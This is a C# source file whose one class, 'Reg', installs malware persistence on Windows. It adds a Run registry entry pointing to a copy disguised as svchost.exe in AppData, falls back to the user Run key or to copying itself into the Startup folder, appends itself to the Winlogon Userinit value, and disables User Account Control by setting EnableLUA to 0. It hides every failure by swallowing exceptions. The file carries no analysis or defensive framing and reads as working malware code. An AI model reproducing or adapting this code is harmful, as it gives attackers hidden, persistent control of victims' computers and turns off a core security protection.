using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace myApp
{
    internal class Reg
    {
        public static void CheckReg()
        {
            string owned = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\dll\" +
                           "svchost.exe";
            string startupfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\dll.exe";
            RegistryKey key;
            
            try
            {
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                if (key.GetValue("dll") == null)
                {
                    key.SetValue("dll", owned);
                }
                else if ((string)key.GetValue("dll") != owned)
                {
                    key.DeleteValue("dll");
                    key.SetValue("dll", owned);
                }
            }
            catch
            {
                try
                {
                    key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    if (key.GetValue("dll") == null)
                    {
                        key.SetValue("dll", owned);
                    }
                    else if ((string)key.GetValue("dll") != owned)
                    {
                        key.DeleteValue("dll");
                        key.SetValue("dll", owned);
                    }
                }
                catch
                {
                    if (!File.Exists(startupfolder))
                        try
                        {
                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, startupfolder);
                        }
                        catch
                        {
                        }
                }
            }
            try
            {
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                string str = key.GetValue("Userinit").ToString();
                if (str.Contains(owned) == false)
                {
                    key.SetValue("Userinit", str + owned + ",");
                }
            }
            catch
            {
            }

            try
            {
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
                string str = key.GetValue("EnableLUA").ToString();
                if (str == "1")
                {
                    key.SetValue("EnableLUA", "0");
                }
            }
            catch
            {
            }
        }
    }
}